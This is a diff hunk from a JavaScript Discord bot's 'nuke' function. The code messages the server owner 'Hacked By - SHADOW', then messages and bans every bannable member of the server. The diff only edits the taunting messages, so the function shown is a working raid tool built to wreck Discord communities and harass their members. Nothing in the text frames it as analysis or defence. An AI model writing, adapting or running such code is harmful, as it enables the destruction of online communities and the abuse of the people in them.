@@ -417,14 +417,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked By - SHADOW ,$  SHADOW DONE SHADOW  A7LA MASA 3LAK ').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW  ').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('HacKed you By SHADOW:ghost: :blush: ').catch(e => { return void e; });
+      await m.send('Hacked By SHADOW &Messi & MG & Ziad & Light ').catch(e => { return void e; });
       return m.ban();
     }
   }));
